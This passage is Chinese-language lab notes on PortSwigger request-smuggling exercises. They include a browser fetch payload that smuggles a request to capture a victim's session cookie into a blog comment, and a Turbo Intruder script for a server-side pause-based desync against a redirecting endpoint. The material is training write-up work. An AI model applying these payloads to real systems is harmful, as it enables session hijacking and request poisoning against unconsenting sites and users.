按照主题教程，构建浏览器控制台的探测代码，此处使用处理重定向代码
由于是窃取cookie，修改走私的头部为控制服务器
`````html
<script>
fetch('https://0aae00360322e196806c0360005400a5.h1-web-security-academy.net', {
    method: 'POST',
    body: `POST /en/post/comment HTTP/1.1\r\nHost: 0aae00360322e196806c0360005400a5.h1-web-security-academy.net\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1000\r\nConnection: keep-alive\r\nCookie: session=yDwlTPjFSqaG6s7n5bgdKeFf7idN8QLE\r\n\r\ncsrf=Af1p8zJCGSOn4cJllaodQ1AdFtToahNs&postId=1&name=a&email=a%40a&website=&comment=`,
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    fetch('https://0aae00360322e196806c0360005400a5.h1-web-security-academy.net/404', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
</script>
`````
与教程不同，此处若使用 location 则失败，location似乎与跳转有相似效果。改为使用 fetch 可成功。示例解决方案使用fetch。
与教程相同，使用burp代理的浏览器则失败，使用其他浏览器则成功
逐渐调整CL大小以覆盖cookie

第二个请求去掉        
mode: 'no-cors',
credentials: 'include'
仍可成功

走私使用fetch确保连接不断，投毒使用location确保刷新缓存


## 基于暂停的失步攻击

### 服务器端暂停型不同步攻击
实验：服务器端基于暂停的请求走私
https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling

> 我们的研究团队在广泛使用的 Apache HTTP 服务器上发现了此漏洞，该服务器在执行从 /example 到 /example/ 的服务器级重定向时表现出此行为

此处应当寻找进行服务器级重定向的端点，
第一个请求前半设置为 / 主页时，将返回400，走私失败
暂时猜测为代码路径不同，示例的后端服务器部分处理数据，对于服务器级重定向返回重定向内容，对于普通端点返回400错误请求

> 在 Burp Repeater 中，尝试发送一个不带尾随斜杠的有效目录请求，例如 GET /resources。观察到你被重定向到 /resources/
将探测请求发送到扩展攻击器中
```
POST /resources HTTP/1.1
Host: 0a2800f403da9b2880b79973005b00e8.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

GET /404/ HTTP/1.1
foo: bar
```


```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            requestsPerConnection=100,
                            pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=63000)

    followUp = 'GET / HTTP/1.1\r\nHost: 0a2800f403da9b2880b79973005b00e8.web-security-academy.net\r\n\r\n'
    engine.queue(followUp)

def handleResponse(req, interesting):
    table.add(req)
```

在63秒时，第一个响应为302重定向，第二个响应为走私的404响应
